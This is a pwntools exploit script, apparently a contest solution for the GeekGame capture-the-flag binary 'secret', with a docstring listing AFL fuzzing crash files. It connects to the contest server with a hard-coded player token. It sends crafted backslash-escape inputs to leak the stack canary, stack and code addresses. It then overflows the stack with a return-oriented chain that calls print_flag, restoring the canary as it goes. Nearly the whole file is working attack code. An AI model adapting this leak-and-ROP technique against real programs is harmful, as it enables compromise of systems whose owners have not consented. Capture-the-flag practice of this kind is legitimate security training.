from pwn import*
import sys,os,os.path
context.log_level='debug'
context(os='linux', arch='amd64')
binary='./secret'
elf=ELF(binary)
debug=1
if debug==0:
    io=process(binary)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
elif debug==1:
    io = remote("prob12.geekgame.pku.edu.cn", 10012)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
elif debug==2:
    io = remote("183.60.136.226",11397)
    libc=ELF('/Users/apple/Documents/libc-all/libc.so-2.23-16.04',checksec=False)

s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
rn      = lambda numb               :io.recvn(numb)
irt     = lambda                    :io.interactive()
# misc functions
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr          :log.success('{} : {:#x}'.format(name, addr))
context.terminal = ['tmux','split','-h']

if debug==1:
    ru("Please input your token: ")
    sl("217:MEQCIHLpLiFNPYI3KBZxPt2PkPZ5IcH1pjr7nALhbc8hiwSlAiA0zL+Q3glpIqz9OOdkjaftoJhX3wu1zqjRAHqZl7iklA==") 

ru(":")
c=b""
c+=b"12"*(6+1+1)
c+=bytes([ord("\\"),0x59])*(0x3f-6-1-1-1-2*9)
c+=bytes([0x5b])
c+=b"\\"*(4*2)
c+=bytes([0x58])
c+=b"\\"*(4*7)
c+=b"\\"
sl(c)

ru(':') #1 -4
c=b"\\"*0x80
sl(c)

ru(':') #2 -2
c=b"\\"*0x80
sl(c)

ru(':') #3 -1
c=b"\\"*0x80
sl(c)

ru(':')
c=b"\\"*0x80
sl(c)

ru("Case #")
canary1=int(ru(':'))

c=b"\\"*0x80
sl(c)
ru("\\"*0x80)
canary=uu64(r(8))-1
leak("canary",canary)

stack=uu64(r(6))
leak("stack",stack)

c=b""
n=22
c+=b"\x5b\x5a"*(n-2)
c+=bytes([ord("\\"),0x5b])*(0x3f-n-2*20)

c+=b"\\"*(4*1)
c+=b"\x5b\x5a"*(2)
c+=b"\\"*(4*19)
c+=b"\\"
sl(c)

ru(':')
c=b"\\"*0x80
sl(c)

ru(':')
c=b"\\"*0x80
sl(c)

ru(":")
c=b""
c+=b"12"*(6+1+1)
c+=bytes([ord("\\"),0x59])*(0x3f-6-1-1-1-2*9)
c+=bytes([0x5b])
c+=b"\\"*(4*2)
c+=bytes([0x58])
c+=b"\\"*(4*7)
c+=b"\\"
sl(c)

ru(':')#1 -4
c=b"\\"*0x80
sl(c)

ru(':') #2 -2
c=b"\\"*0x80
sl(c)

ru(':')#3 -1
c=b"\\"*0x80
sl(c)

ru(':')
c=b"\\"*0x80
sl(c)

ru(':\n')
c=b"\\"*0x80
sl(c)

print(r().split(b":"))
ru("\\"*0x80)
code=uu64(r(6))-1-0x1500
leak("code",code)
leak("canary",canary)
#gdb.attach(io,"b*(0x555555554000+0x0000000000000000001485 )\nb*(0x555555554000+0x0000000000000000014AA )")

#写print_flag
pop_rdi_ret=0x00000000000015f3 
flag_addr=0x000002091
print_flag=0x000014AA 
ru(':')#3 -1
n=0x20-3-0x10+8
c=b"11"*n
c+=bytes([ord("\\"),0x59])*(0x40-n-4-2)
c+=b"\\"*4
c+=p64(code+print_flag)[:6]
c+=b"\\"
sl(c)


#末位的0
ru(':')
n=0x20-3-0x10+4+3
c=b"11"*n
c+=bytes([ord("\\"),0x59])*(0x40-n-4-1+4)
c+=b"\\"
sl(c)

#写pop_rdi_ret
ru(':')
n=0x20-3-0x10+4
c=b"11"*n
c+=bytes([ord("\\"),0x59])*(0x40-n-4-2)
c+=b"\\"*4
c+=p64(code+flag_addr)[:6]
c+=b"\\"
sl(c)

#末位的0
ru(':')
n=0x20-3-0x10+3
c=b"11"*n
c+=bytes([ord("\\"),0x59])*(0x40-n-4-1+4)
c+=b"\\"
sl(c)

ru(':')
n=0x20-3-0x10
c=b"11"*n
c+=bytes([ord("\\"),0x59])*(0x40-n-4-2)
c+=b"\\"*4
c+=p64(code+pop_rdi_ret)[:6]
c+=b"\\"
sl(c)

#写canary
ru(':')#3 -1
n=0x20-3-0x10-0x8
c=b"11"*n
c+=bytes([ord("\\"),0x59])*(0x40-n-4-2-1)
c+=b"\\"*4
c+=p64(canary+1)
c+=b"\\"
sl(c)

#写canary末位的0
ru(':')#3 -1
n=0x20-3-0x10-0x8
c=b"11"*n
c+=bytes([ord("\\"),0x59])*(0x40-n-4-2-1+4)
c+=b"\\"*4
c+=b"\\"
sl(c)

io.interactive()


"""
README.txt                                                    
 
//普通溢出 0x555555555452 <work+533>    mov    byte ptr [rax], dl
./aflsecret/output/crashes/id:000000,sig:06,src:000000,time:8546,op:int8,pos:128,val:+0  
./aflsecret/output/crashes/id:000001,sig:06,src:000000,time:13994,op:havoc,rep:32 
./aflsecret/output/crashes/id:000002,sig:06,src:000000,time:42483,op:havoc,rep:16
./aflsecret/output/crashes/id:000003,sig:06,src:000000,time:88344,op:havoc,rep:4  //普通溢出
./aflsecret/output/crashes/id:000004,sig:06,src:000026,time:375982,op:int8,pos:111,val:+32
./aflsecret/output/crashes/id:000005,sig:06,src:000032,time:644008,op:havoc,rep:128 //普通溢出
./aflsecret/output/crashes/id:000006,sig:06,src:000032,time:658673,op:havoc,rep:64
./aflsecret/output/crashes/id:000007,sig:06,src:000037,time:698728,op:flip8,pos:260 //普通溢出
./aflsecret/output/crashes/

"""